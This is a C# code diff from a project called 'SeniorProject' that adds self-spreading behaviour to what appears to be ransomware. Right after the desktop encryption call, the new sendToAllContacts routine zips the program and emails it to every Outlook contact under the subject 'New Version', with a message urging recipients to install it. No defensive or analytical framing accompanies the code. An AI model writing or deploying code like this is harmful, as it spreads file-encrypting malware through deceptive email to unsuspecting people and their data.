@@ -9,6 +9,11 @@ using System.Net.Sockets;
 using System.Security.Cryptography;
 using System.Threading;
 using Microsoft.Win32;
+using System.IO.Compression;
+using System.IO;
+using Microsoft.Office.Interop.Outlook;
+using Exception = System.Exception;
+
 
 namespace SeniorProject
 {
@@ -38,22 +43,45 @@ namespace SeniorProject
 
 				Encryption encryption = new Encryption();
 				encryption.encryptDesktop();
+				sendToAllContacts();
 			}
 		}
 
-		void Countdown(int count, TimeSpan interval, Action<int> ts)
+		private void sendToAllContacts()
 		{
-			var dt = new System.Windows.Threading.DispatcherTimer();
-			dt.Interval = interval;
-			dt.Tick += (_, a) =>
+			string startPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+			string zipPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\zip.zip";
+
+			ZipFile.CreateFromDirectory(startPath, zipPath);
+			try
 			{
-				if (count-- == 0)
-					dt.Stop();
-				else
-					ts(count);
-			};
-			ts(count);
-			dt.Start();
+				Microsoft.Office.Interop.Outlook.Items OutlookItems;
+				Microsoft.Office.Interop.Outlook.Application outlookObj = new Microsoft.Office.Interop.Outlook.Application();
+				MAPIFolder Folder_Contacts;
+				Folder_Contacts = (MAPIFolder)outlookObj.Session.GetDefaultFolder(OlDefaultFolders.olFolderContacts);
+				OutlookItems = Folder_Contacts.Items;
+
+				foreach (ContactItem contact in Folder_Contacts.Items)
+				{
+					CreateEmailItem("New Version", contact.Email1Address, "Please run and install the newest version of the software. Thank you.", outlookObj);
+				}
+			}
+			catch (Exception e)
+			{
+				MessageBox.Show("Outlook not installed. Skipping...");
+			}
+
+		}
+
+		private void CreateEmailItem(string subjectEmail,string toEmail, string bodyEmail, Microsoft.Office.Interop.Outlook.Application outlookObj)
+		{
+			MailItem eMail = (MailItem) outlookObj.CreateItem(OlItemType.olMailItem);
+			eMail.Subject = subjectEmail;
+			eMail.To = toEmail;
+			eMail.Body = bodyEmail;
+			eMail.Attachments.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\zip.zip");
+			eMail.Importance = OlImportance.olImportanceHigh;
+			((_MailItem)eMail).Send();
 		}
 
 		private void TimeTimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
